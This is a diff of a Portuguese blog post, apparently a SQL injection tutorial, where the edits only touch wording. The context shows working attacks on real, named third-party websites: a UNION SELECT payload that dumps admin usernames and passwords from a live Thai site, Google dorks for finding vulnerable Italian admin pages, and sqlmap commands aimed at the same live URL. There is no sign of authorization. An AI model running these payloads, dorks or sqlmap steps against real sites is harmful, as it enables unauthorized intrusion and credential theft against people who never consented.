@@ -52,13 +52,13 @@ Só por curiosidade, experimente incrementar o valor passado para a variável id
 
 Esses valores são identificadores de dados armazenados no banco. De certa forma, quando você manipula esses valores você está interagindo com o banco de dados do site, uma vez que, a cada valor diferente de ID que você definir gerará uma consulta SELECT diferente pelo script news.php.
 
-Se você acrescentar uma aspa simples junto ao id, você poderá ver uma mensagem de erro retornada:
+Se você acrescentar uma aspa simples junto ao id, poderá ver uma mensagem de erro retornada:
 
 ```
 http://www.thailandquitline.or.th/news.php?id=60'
 ```
 
-Isso aconteceu porque a consulta feita pelo news.php para o banco de dados foi 'corrompida'. Uma vez que o número passado para a variável id continha um código SQL (o aspa ' ). Isso é um bom sinal. Indo mais além olhe isto:
+Isso aconteceu porque a consulta feita pelo news.php para o banco de dados foi 'corrompida', uma vez que o número passado para a variável id continha um código SQL (o aspa ' ). Isso é um bom sinal. Indo mais além, olhe isto:
 
 ```
 http://www.thailandquitline.or.th/news.php?id=-58 union all select concat(username,0x3a,password),2,3,4 from admin--
@@ -80,11 +80,11 @@ Ciente de que existe um padrão na exploração de SQL injection (detecção do 
 
 A resposta: GOOGLE
 
-Os sites que postei aqui nesse post foram encontrados por ele. Eu me utilizei de recursos avançados do Google para pesquisas mais específicas.
+Os sites que postei aqui foram encontrados por ele. Eu me utilizei de recursos avançados do Google para pesquisas mais específicas.
 
 Help: https://support.google.com/websearch/answer/2466433?hl=pt-BR
 
-Pesquisas específicas utilizando de operadores avançados de pesquisa do Google são comumente chamados de "dorks", exemplo de como encontrei os sites vulneráveis da Itália:
+Buscas específicas utilizando de operadores avançados de pesquisa do Google são comumente chamados de "dorks", exemplo de como encontrei os sites vulneráveis da Itália:
 
 ```
 inurl:/admin/admin.php +site:it
@@ -201,7 +201,7 @@ $ python sqlmap.py -u http://www.thailandquitline.or.th/news.php?id=1 --current-
 ```
 
 - Obs: O parâmetro -v 0 é legal para diminuir a "verbosidade" do sqlmap. Polui menos o shell.
-- Obs2: Com a opção --current-db o sqlmap nos retornará o esperado nome da database. Isso é importante para o próximo passo, onde uma vez de posse do nome do banco, o sqlmap vai conseguir fazer as consultas ao SGDB de forma mais apropriada.
+- Obs²: Com a opção <code>--current-db</code> o sqlmap nos retornará o esperado nome da database. Isso é importante para o próximo passo, onde uma vez de posse do nome do banco, o sqlmap vai conseguir fazer as consultas ao SGDB de forma mais apropriada.
 
 
 Ele vai te retornar algo como isto:
